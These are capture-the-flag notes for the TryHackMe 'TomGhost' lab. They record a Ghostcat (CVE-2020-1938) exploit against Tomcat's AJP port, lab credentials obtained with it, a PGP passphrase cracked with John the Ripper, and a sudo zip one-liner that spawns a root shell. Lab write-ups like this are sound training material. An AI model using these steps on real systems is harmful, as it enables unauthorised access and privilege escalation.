# TomGhost

### IP: 10.10.102.122

### PORTS:
- 22
- 53
- 8080 - tomcat - v9.0.30
- 8009 - apache-jserv v1.3

### AJP
- ghostcat
- CVE-2020-1938 
> https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.py
- running CVE-2020-1938.py - errors
- tried another ghostcat-POC, fixed it for python3
- got creds: skyfuck:8730281lkjlkjdqlksalks
- got files
    - credential.pgp
    - tryhackme.asc
- got user.txt in /home/merlin
- skyfuck can't sun sudo

### PGP
- cracked asc with JtR
- pass: alexandru
- decrypyted credential.gpg
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

### MERLIN
```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```
### Privilage Escalation - GTFOBIN
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
- got /root/root.txt



